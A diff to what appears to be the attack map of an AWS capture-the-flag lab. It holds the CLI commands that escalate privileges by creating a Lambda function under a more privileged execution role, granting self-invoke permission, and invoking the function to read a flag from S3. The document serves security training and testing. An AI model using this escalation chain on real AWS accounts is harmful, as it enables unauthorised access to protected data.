@@ -86,7 +86,7 @@ attackMap:
             EOF
             zip /tmp/lambda_payload.zip /tmp/lambda_payload.py
         - description: "Create the Lambda function with the target execution role"
-          command: "aws lambda create-function --function-name pl-lambda-006-to-bucket-escalation --runtime python3.11 --role arn:aws:iam::{account_id}:role/pl-prod-lambda-006-to-bucket-target-role --handler lambda_payload.handler --zip-file fileb:///tmp/lambda_payload.zip --timeout 30"
+          command: "ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text) && aws lambda create-function --function-name pl-lambda-006-to-bucket-escalation --runtime python3.11 --role arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-lambda-006-to-bucket-target-role --handler lambda_payload.handler --zip-file fileb:///tmp/lambda_payload.zip --timeout 30"
 
     - from: starting-user
       to: malicious-lambda
@@ -99,7 +99,7 @@ attackMap:
       hints: []
       commands:
         - description: "Grant the starting user permission to invoke the Lambda function"
-          command: "aws lambda add-permission --function-name pl-lambda-006-to-bucket-escalation --statement-id AllowSelfInvoke --action lambda:InvokeFunction --principal arn:aws:iam::{account_id}:user/pl-prod-lambda-006-to-bucket-starting-user"
+          command: 'ACCOUNT_ID=$(aws sts get-caller-identity --query ''Account'' --output text) && USER_ARN="arn:aws:iam::${ACCOUNT_ID}:user/pl-prod-lambda-006-to-bucket-starting-user" && aws lambda add-permission --function-name pl-lambda-006-to-bucket-escalation --statement-id AllowSelfInvoke --action lambda:InvokeFunction --principal "$USER_ARN" --source-arn "$USER_ARN"'
 
     - from: malicious-lambda
       to: target-role
@@ -111,7 +111,7 @@ attackMap:
       hints: []
       commands:
         - description: "Invoke the Lambda function to read the flag from S3"
-          command: "aws lambda invoke --function-name pl-lambda-006-to-bucket-escalation --payload '{\"bucket\": \"pl-prod-lambda-006-to-bucket-{account_id}-{suffix}\"}' /tmp/lambda_output.json && cat /tmp/lambda_output.json"
+          command: 'TARGET_BUCKET=<paste the target_bucket_name output here> && aws lambda invoke --function-name pl-lambda-006-to-bucket-escalation --payload "{\"bucket\": \"${TARGET_BUCKET}\"}" /tmp/lambda_output.json && cat /tmp/lambda_output.json'
 
     - from: target-role
       to: target-bucket
@@ -123,9 +123,9 @@ attackMap:
         target role's credentials from a successful invocation, the flag can be
         retrieved directly from S3.
       hints:
-        - "The flag is returned in the Lambda invocation response body. Parse the JSON output to extract it, or use the S3 credentials available through the execution role to fetch flag.txt directly."
+        - "The flag is returned in the Lambda invocation response body. Parse the JSON output to extract it. The direct S3 read (aws s3 cp s3://${TARGET_BUCKET}/flag.txt -, with TARGET_BUCKET from the target_bucket_name output on the Outputs tab) denies for the starting user — only the execution role holds s3:GetObject."
       commands:
         - description: "Extract the flag from the Lambda response"
           command: "cat /tmp/lambda_output.json | python3 -c \"import sys,json; r=json.load(sys.stdin); print(json.loads(r['body'])['flag'])\""
-        - description: "Alternatively, retrieve the flag directly from S3"
-          command: "aws s3 cp s3://pl-prod-lambda-006-to-bucket-{account_id}-{suffix}/flag.txt -"
+        - description: "Canonical S3 read of the flag object (denies for the starting user; the invoke response is the capture path)"
+          command: "aws s3 cp s3://${TARGET_BUCKET}/flag.txt -"
